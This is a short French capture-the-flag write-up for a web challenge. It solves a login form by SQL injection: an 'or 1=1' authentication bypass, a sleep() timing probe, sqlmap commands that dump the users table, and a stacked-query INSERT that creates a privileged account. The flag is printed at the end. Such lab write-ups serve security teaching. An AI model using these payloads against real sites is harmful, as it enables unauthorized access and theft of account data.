# Web 100 - Super Query Login v2

La suite d’une série d’injection SQL avec un champ de connexion. On se connecte avec une injection
classique:

>‘or 1=1 limit 1 #

On est connecté mais on nous indique que nous n’avons pas le rang nécessaire (rang = 0).
On essaie de se connecter sur d’autres comptes en faisant varier le paramètre “limit”
> ‘or 1=1 limit 1,2 #

Malheureusement aucun compte ne semble avoir le rang espéré. On va essayer de faire une requête à la
suite de la requête principale:

```sql
SELECT something FROM table WHERE something = ‘$username’ AND something =’ $password’ ;DEUXIEME_REQUETE```


On injecte donc avec: ‘ and sleep(5) # On remarque que le chargement de la page est beaucoup plus
long que la normal du fait de la pause demandée via l’injection à MySQL.
La suite de notre exploitation va consister à ajouter un nouvel utilisateur dans la base de données avec le
rang adéquat. Pour faciliter l’exploitation on peut passer par sqlmap afin de récupérer la table contenant
les utilisateurs et les colonnes de celle-ci.

> python
sqlmap.py
-u
"http://ese.crashlab.org/bla/ctf/web/web7/"
"username=toto&password=toto" -p "username" --level 3 --threads 4
--data


La faille est exploitable en blind avec RLIKE, on récupère ce dont on a besoin:

>python
sqlmap.py
-u
"http://ese.crashlab.org/bla/ctf/web/web7/"
"username=toto&password=toto" -p "username" --level 3 --threads 4 --dump
--data


On a alors une table web3_users avec les colonnes: id, password, rank et username. Notre injection pour
ajouter un nouvel utilisateur se résume alors à:
```sql
Login = ' ; INSERT INTO web3_users(id, username, password, rank) VALUES (987,‘bob’,‘bob’, 1) #```

On se connecte avec le compte créé et on obtient le flag: **ESE{St4cKeD_Qu3rIeS}**